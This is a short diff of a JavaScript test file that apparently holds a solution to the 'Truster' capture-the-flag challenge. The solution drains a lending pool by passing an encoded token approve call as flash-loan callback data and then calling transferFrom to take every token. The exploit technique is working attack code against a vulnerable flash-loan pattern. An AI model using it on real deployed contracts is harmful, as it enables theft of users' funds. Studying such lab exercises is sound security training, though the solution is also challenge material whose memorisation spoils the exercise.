@@ -27,20 +27,19 @@ describe("[Challenge] Truster", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
-    console.log("attacker address is: ", attacker.address);
     const iface = new ethers.utils.Interface([
       "function approve(address spender, uint256 amount)",
     ]);
     const data = iface.encodeFunctionData("approve", [
-      attacker.address.toString(),
+      player.address,
       TOKENS_IN_POOL,
     ]);
-    await this.pool
-      .connect(attacker)
-      .flashLoan(0, attacker, this.token.address, data);
-    await this.token
-      .connect(attacker)
-      .transferFrom(this.pool.address, attacker, TOKENS_IN_POOL);
+    await pool
+      .connect(player)
+      .flashLoan(0, player.address, token.address, data);
+    await token
+      .connect(player)
+      .transferFrom(pool.address, player.address, TOKENS_IN_POOL);
   });
 
   after(async function () {
